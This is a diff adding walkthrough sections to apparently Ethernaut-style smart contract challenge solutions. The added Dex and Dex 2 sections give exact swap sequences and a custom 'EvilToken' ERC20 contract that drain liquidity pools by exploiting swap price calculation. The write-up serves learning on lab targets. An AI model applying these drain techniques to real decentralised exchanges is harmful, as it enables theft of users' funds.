@@ -270,3 +270,52 @@ The goal of this challnge is to Deny funds. The very first step is to make an at
 The reason on why this work is because the external call doesnt check the return value is susceptible to the costly loop to consume all gas. 
 ## Shop 
 To pass this level a buyer can cheat by returning a legit value in price to pass the first if statment and during the second invocation they can set the price of the prodcut. The code will be in ShopA.sol
+
+## Dex 
+The goal to pass this level is to drain token1 or token2. The vulenrability would originitate from get swap price function. To solve this just allow an approvance of around 500 tokens 
+```
+await contract.approve(contract.address, 500)
+```
+after that saves the token address in variable 
+```
+t1 = await contract.token1()
+t2 = await contract.token2()
+```
+```
+await contract.swap(t1, t2, 10)
+await contract.swap(t2, t1, 20)
+await contract.swap(t1, t2, 24)
+await contract.swap(t2, t1, 30)
+await contract.swap(t1, t2, 41)
+await contract.swap(t2, t1, 45)
+```
+Now perform the swaps like above 
+then after that it should be draoned and ypu can submit the instance 
+## Dex 2 
+This challnge is similar but with this challenge we have to drain both of the token but what make it easier is that we can make our token to exchange it. 
+So first you make a simple ERC20 token 
+```
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+
+contract EvilToken is ERC20 {
+    constructor(uint256 initialSupply) ERC20("EvilToken", "EVL") {
+        _mint(msg.sender, initialSupply);
+    }
+}
+```
+Get our token address 
+```
+evlToken = '<EVL-token-address>'
+t1 = await contract.token1()
+t2 = await contract.token2()
+```
+This should drain token1 
+```
+await contract.swap(evlToken, t1, 100)
+```
+This should drain token2 
+```
+await contract.swap(evlToken, t2, 200)
+```
